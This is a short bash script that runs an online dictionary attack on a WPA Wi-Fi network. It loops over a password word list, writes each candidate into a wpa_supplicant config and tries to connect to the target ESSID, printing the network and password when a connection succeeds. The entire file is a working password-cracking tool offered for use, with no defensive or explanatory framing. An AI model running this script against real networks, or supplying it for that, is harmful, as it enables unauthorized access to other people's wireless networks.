#!/bin/bash

if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]
then
	echo "Usage: $0 network device password.txt [-v]"
	echo "network: target essid"
	echo "device: wireless device to use"
	echo "password.txt: word list, new line separated"
	echo "-v: verbose"
	exit 1
fi

if [[ $EUID -ne 0 ]]; then
	echo "wpa_supplicant needs root"
	exit 2
fi

NETWORK="$1"
DEVICE="$2"
PASSWORDS="$3"

while read -r line
do

	if [ "$4" == "-v" ]; then echo "$line"; fi

	./wpa_supplicant/wpa_passphrase "$NETWORK" "$line" > wpa.conf
	if [ "$4" == "-v" ]; then grep "^\spsk" wpa.conf; fi

	res=`./wpa_supplicant/wpa_supplicant -i "$DEVICE" -c wpa.conf`

	if [ "$?" == "0" ] && [ "$res" == "1" ]
	then
		echo "$NETWORK:$line"
		break
	fi

done < $PASSWORDS

